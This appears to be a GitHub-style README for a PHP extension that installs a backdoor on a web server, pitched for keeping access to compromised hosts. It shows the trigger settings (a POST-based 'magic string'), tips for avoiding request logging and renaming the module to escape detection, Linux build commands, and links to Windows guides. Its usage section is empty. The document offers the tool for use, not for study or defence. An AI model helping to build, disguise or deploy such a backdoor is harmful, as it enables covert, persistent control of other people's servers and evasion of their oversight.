# PHP Backdoor Module

This is an example module for adding a backdoor to the PHP installation on a webserver by adding a PHP module. Very useful for mantaining access to a compromised host.

#Build Instructions

First off, you are going to want to edit the "magic string" (or rather, variable), and method. I have set them to POST, because GET variables get logged. You might want to edit some other things so it doesn't show up as "backdoor".

## Linux
```
        char* method = "_POST"; // HTTP method used
        char* secret_string = "execute"; // magic string
```

## Windows
```
        char* method = "_POST"; // HTTP method used
        char* secret_string = "secret_string"; // magic string
```

And next, we compile. For windows, I link to the articles (original in Russian, mine in English which is basically a translation I did).

##Windows:
[Original Russian Article][russian]

[English 'translation'][english]

##Linux:
`sudo apt-get install php5-dev`  
`phpize && ./configure && make`

# Use Instructions



[russian]: http://stackoff.ru/pishem-rasshirenie-bekdor-dlya-php/
[english]: http://example.com/
